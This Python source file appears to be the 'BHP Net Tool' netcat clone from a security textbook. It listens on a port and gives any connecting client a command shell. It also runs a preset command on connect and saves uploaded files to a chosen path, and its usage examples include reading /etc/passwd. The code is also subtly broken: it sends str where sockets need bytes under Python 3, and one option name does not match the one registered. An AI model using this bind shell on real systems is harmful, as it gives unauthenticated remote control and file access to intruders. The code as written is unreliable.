import sys
import socket
import getopt
import threading
import subprocess

# global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen                 -listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to-run    -execute the given file upon receiving a connection")
    print("-c --command                -initialize a command shell")
    print("-u --upload=destination     -upon receiving connection upload a file and write to [destination]")
    print()
    print()
    print("Examples:")
    print("bnpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bnpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bnpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bnpnet.py -t 192.168.11.12 -p 135")
    sys.exit()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the option of command line
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # To monitor or send data only from standard input?
    if not listen and len(target) and port > 0:
        # Read memory data from the command line
        # There will be blocked, so no longer send CTRL-D when sending data to standard input
        buffer = sys.stdin.read()

        # Send data
        client_sender(buffer)

    # Start monitoring for data and prepare to upload files and execute commands
    # place a shell_rebound
    # Depending on the command line options above
    if listen:
        server_loop()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target_host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:

            # Now wait for the data to be returned
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response)

            # Wait for more input
            buffer = input("")
            buffer += "\n"

            # Send
            client.send(buffer)

    except:
        print("[*] Exception! Exiting.")

        # Close the connection
        client.close()


def server_loop():
    global target
    global port

    # If no target is defined, then we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)
    print("Listening [%s:%s]..." % (target, port))

    while True:
        client_socket, addr = server.accept()

        # Split a thread to process a new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    # Line feed
    command = command.rstrip()

    # Run the command and return the output
    # subprocess provides a powerful process creation interface, which can provide a variety of ways to interact with client programs.
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # Send the output
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # check the upload file
    if len(upload_destination):
        # Read all characters and write down the target
        file_buffer = ""

        # Read data continuously until there is no consistent data

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # receive the data and write
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # Confirming the document has been written out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # Check command execution
    if len(execute):
        # Run command
        output = run_command(execute)
        client_socket.send(output)

    # If need a command line shell, then into another loop
    if command:

        while True:
            # Jump out of a window
            client_socket.send("<BHP:#> ")

            # Receiving files until find the enter key
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # Return command output
            response = run_command(cmd_buffer)

            # Return response data
            client_socket.send(response)


main()
